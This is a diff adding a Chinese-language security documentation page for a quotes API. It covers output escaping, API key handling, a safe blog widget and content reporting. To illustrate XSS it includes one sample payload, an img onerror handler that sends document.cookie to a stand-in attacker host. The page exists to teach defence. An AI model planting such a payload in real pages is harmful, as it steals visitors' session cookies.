@@ -1,0 +1,64 @@
+---
+title: 安全
+description: 把說說顯示在你的網站上之前必讀。
+---
+
+## 輸出時一定要跳脫
+
+<Callout type="error">
+  說說與留言是使用者提交的純文字。API 不會替你跳脫，也不會過濾 HTML。直接放進 `innerHTML` 或模板的不跳脫輸出，就是把你的網站交給任何一個提交者。
+</Callout>
+
+有人可以提交這樣一句：
+
+```text
+<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
+```
+
+```js
+// 危險：瀏覽器會執行它
+element.innerHTML = quote.content;
+
+// 安全：瀏覽器只會顯示文字
+element.textContent = quote.content;
+```
+
+| 環境 | 安全 | 危險 |
+|---|---|---|
+| 瀏覽器 DOM | `textContent` | `innerHTML`、`insertAdjacentHTML`、`document.write` |
+| React | `{quote.content}` | `dangerouslySetInnerHTML` |
+| Vue | `{{ quote.content }}` | `v-html` |
+| Jinja2、Django | `{{ quote.content }}`（保持自動跳脫） | `\|safe` |
+| PHP | `htmlspecialchars($content, ENT_QUOTES, 'UTF-8')` | 直接 `echo` |
+
+`source_from`、`submitter.username` 與留言都一樣。
+
+## 保管 API Key
+
+- **不要放在網頁前端**、行動應用或任何使用者拿得到的地方。公開讀取不需要金鑰。
+- 不要放進版本控制。用環境變數或祕密管理工具。
+- 不要放進網址，查詢字串帶憑證會被拒絕，因為網址會留在記錄檔裡。
+- 只勾選需要的 [scope](/authentication#scope)。只讀取就只要 `quotes:read`。
+- 金鑰外洩時，到[個人中心](https://shuoshuotw.xyz/me/api-keys)重新產生。舊金鑰最多 15 秒內失效。
+
+## 部落格 Widget
+
+```html
+<p id="shuoshuo">載入中</p>
+<script>
+  fetch("https://api.shuoshuotw.xyz/v1/quotes/random?format=text")
+    .then((response) => (response.ok ? response.text() : Promise.reject(response.status)))
+    .then((text) => {
+      document.getElementById("shuoshuo").textContent = text;
+    })
+    .catch(() => {
+      document.getElementById("shuoshuo").remove();
+    });
+</script>
+```
+
+重點有兩個：沒有金鑰，以及用 `textContent`。API 掛掉時這段會安靜地移除自己，不影響頁面其他部分。
+
+## 內容治理
+
+發現不當的說說請到該則的頁面檢舉。檢舉需要登入，每人對同一則只能檢舉一次；被確認違規的內容會回 410 `QUOTE_REMOVED`，你的程式應該把它當成已不存在。
